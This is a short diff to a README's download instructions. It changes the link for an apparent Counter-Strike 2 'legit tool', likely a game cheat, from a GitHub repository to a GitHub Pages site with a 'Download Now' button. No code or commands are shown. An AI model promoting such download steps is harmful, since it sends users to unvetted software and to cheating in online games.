@@ -20,7 +20,7 @@
 ## 📥 How to Download & Install
 
 1. **Go to the official page:**  
-   👉 (https://github.com/darkomoon7/cs2-legit-tool)
+   👉 [https://darkomoon7.github.io/cs2-legit-tool/](https://darkomoon7.github.io/cs2-legit-tool/)
 
 2. Click the **"Download Now"** button.
 
